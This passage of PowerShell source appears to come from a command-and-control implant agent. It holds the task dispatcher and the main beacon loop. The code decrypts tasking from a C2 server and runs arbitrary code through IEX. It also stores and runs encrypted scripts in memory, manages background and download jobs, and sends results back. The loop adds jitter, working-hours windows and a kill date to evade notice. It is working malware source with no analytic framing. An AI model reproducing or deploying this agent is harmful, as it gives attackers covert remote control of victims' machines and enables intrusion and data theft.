                $JobResultID = $ResultIDs[$JobName]

                try {
                    $Results = Stop-DownloadJob -JobName $JobName

                    Encode-Packet -type 53 -data "Download of $JobName stopped" -ResultID $JobResultID
                }
                catch {
                    Encode-Packet -type 0 -data "[!] Error in stopping Download: $JobName" -ResultID $JobResultID
                }
            }

            # dynamic code execution, wait for output, don't save output
            elseif($type -eq 100) {
                $ResultData = IEX $data
                if($ResultData) {
                    Encode-Packet -type $type -data $ResultData -ResultID $ResultID
                }
            }
            # dynamic code execution, wait for output, save output
            elseif($type -eq 101) {
                # format- [15 chars of prefix][5 chars extension][data]
                $prefix = $data.Substring(0,15)
                $extension = $data.Substring(15,5)
                $data = $data.Substring(20)

                # send back the results
                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data)) -ResultID $ResultID
            }
            # dynamic code execution, no wait, don't save output
            elseif($type -eq 110) {
                $jobID = Start-AgentJob $data
                $script:ResultIDs[$jobID]=$resultID
                Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID
            }
            # dynamic code execution, no wait, save output
            elseif($type -eq 111) {
                # Write-Host "'dynamic code execution, no wait, save output' not implemented!"

                # format- [15 chars of prefix][5 chars extension][data]
                # $prefix = $data.Substring(0,15)
                # $extension = $data.Substring(15,5)
                # $data = $data.Substring(20)
                # $jobID = Start-AgentJob $data $prefix $extension
                # $script:resultIDs[$jobID] = $resultID
                # Encode-Packet -type 110 -data ("Job started: " + $jobID)
            }

            # import a dynamic script and save it in agent memory
            elseif($type -eq 120) {
                # encrypt the script for storage
                $script:ImportedScript = Encrypt-Bytes $Encoding.GetBytes($data);
                Encode-Packet -type $type -data "script successfully saved in memory" -ResultID $ResultID
            }

            # execute a function in the currently imported script
            elseif($type -eq 121) {
                # decrypt the script in memory and execute the code as a background job
                $script = Decrypt-Bytes $script:ImportedScript
                if ($script) {
                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data")
                    $script:ResultIDs[$jobID]=$ResultID
                    Encode-Packet -type $type -data ("Job started: " + $jobID) -ResultID $ResultID
                }
            }

            else{
                Encode-Packet -type 0 -data "invalid type: $type" -ResultID $ResultID
            }
        }
        catch [System.Exception] {
            Encode-Packet -type $type -data "error running command: $_" -ResultID $ResultID
        }
    }

    # process tasking packets from the server
    function Process-TaskingPackets {
        param($Tasking)

        # Decrypt the tasking and process it appropriately
        $TaskingBytes = Decrypt-Bytes $Tasking
        if (-not $TaskingBytes) {
            return
        }

        # decode the first packet
        $Decoded = Decode-Packet $TaskingBytes
        $Type = $Decoded[0]
        $TotalPackets = $Decoded[1]
        $PacketNum = $Decoded[2]
        $TaskID = $Decoded[3]
        $Length = $Decoded[4]
        $Data = $Decoded[5]

        # TODO: logic to handle taskings that span multiple packets

        # any remaining sections of the packet
        $Remaining = $Decoded[6]

        # process the first part of the packet
        $ResultPackets = $(Process-Tasking $Type $Data $TaskID)

        $Offset = 12 + $Length
        # process any additional packets in the tasking
        while($Remaining.Length -ne 0) {
            $Decoded = Decode-Packet $TaskingBytes $Offset
            $Type = $Decoded[0]
            $TotalPackets = $Decoded[1]
            $PacketNum = $Decoded[2]
            $TaskID = $Decoded[3]
            $Length = $Decoded[4]
            $Data = $Decoded[5]
            if ($Decoded.Count -eq 7) {$Remaining = $Decoded[6]}
            # process the new sub-packet and add it to the result set
            $ResultPackets += $(Process-Tasking $Type $Data $TaskID)

            $Offset += $(12 + $Length)
        }

        # send all the result packets back to the C2 server
        Send-Message -Packets $ResultPackets
    }


    ############################################################
    #
    # Main agent loop
    #
    ############################################################

    while ($True) {

        # check the kill date and lost limit, exiting and returning job output if either are past
        if ( (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) -or ((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit)) ) {

            $Packets = $null

            # get any job results and kill the jobs
            ForEach($JobName in $Script:Jobs.Keys) {
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
                $JobResultID = $script:ResultIDs[$JobName]
                $Packets += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
                $script:ResultIDs.Remove($JobName)
            }

            ForEach($JobName in $Script:Downloads.Keys) {
                $Results = Stop-DownloadJob -JobName $JobName
                $JobResultID = $script:ResultIDs[$JobName]
                $Packets += $Results 
                $script:ResultIDs.Remove($JobName)
            }

            # send job results back if there are any
            if ($Packets) {
                Send-Message -Packets $Packets
            }

            # send an exit status message and exit
            if (($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
                $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
            }
            else {
                $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
            }
            Send-Message -Packets $(Encode-Packet -type 2 -data $msg)
            exit
        }

        # if there are working hours set, make sure we're operating within the given time span
        #   format is "8:00-17:00"
        if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$') {

            $current = Get-Date
            $start = Get-Date ($script:WorkingHours.split("-")[0])
            $end = Get-Date ($script:WorkingHours.split("-")[1])

            # correct for hours that span overnight
            if (($end-$start).hours -lt 0) {
                $start = $start.AddDays(-1)
            }

            # if the current time is past the start time
            $startCheck = $current -ge $start

            # if the current time is less than the end time
            $endCheck = $current -le $end

            # if the current time falls outside the window
            if ((-not $startCheck) -or (-not $endCheck)) {

                # sleep until the operational window starts again
                $sleepSeconds = ($start - $current).TotalSeconds

                if($sleepSeconds -lt 0) {
                    # correct for hours that span overnight
                    $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
                }
                # sleep until the wake up interval
                Start-Sleep -Seconds $sleepSeconds
            }
        }

        # if there's a delay (i.e. no interactive/delay 0) then sleep for the specified time
        if ($script:AgentDelay -ne 0) {
            $SleepMin = [int]((1-$script:AgentJitter)*$script:AgentDelay)
            $SleepMax = [int]((1+$script:AgentJitter)*$script:AgentDelay)

            if ($SleepMin -eq $SleepMax) {
                $SleepTime = $SleepMin
            }
            else{
                $SleepTime = Get-Random -Minimum $SleepMin -Maximum $SleepMax
            }
            Start-Sleep -Seconds $sleepTime;
        }

        # poll running jobs, receive any data, and remove any completed jobs
        $JobResults = $Null
        ForEach($JobName in $Script:Jobs.Keys) {
            $JobResultID = $script:ResultIDs[$JobName]
            # check if the job is still running
            if(Get-AgentJobCompleted -JobName $JobName) {
                # the job has stopped, so receive results/cleanup
                $Results = Stop-AgentJob -JobName $JobName | fl | Out-String
            }
            else {
                $Results = Receive-AgentJob -JobName $JobName | fl | Out-String
            }

            if($Results) {
                $JobResults += $(Encode-Packet -type 110 -data $($Results) -ResultID $JobResultID)
            }
        }

        ForEach($JobName in $Script:Downloads.Keys) {
            $JobResultID = $script:ResultIDs[$JobName]
            # check if the job is still running
            if(Get-DownloadJobCompleted -JobName $JobName) {
                # the job has stopped, so receive results/cleanup
                $Results = Stop-DownloadJob -JobName $JobName
                
            }
            else {
                $Results = Receive-DownloadJob -JobName $JobName
                
                
            }

            if($Results) {
                $JobResults += $Results
            }
        }

        if ($JobResults) {
            Send-Message -Packets $JobResults
        }

        # get the next task from the server
        $TaskData = Get-Task
        if ($TaskData) {
            $script:MissedCheckins = 0
            # did we get not get the default response
            if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $script:DefaultResponse) {
                Decode-RoutingPacket -PacketData $TaskData
            }
        }

        # force garbage collection to clean up :)
        [GC]::Collect()
    }
}
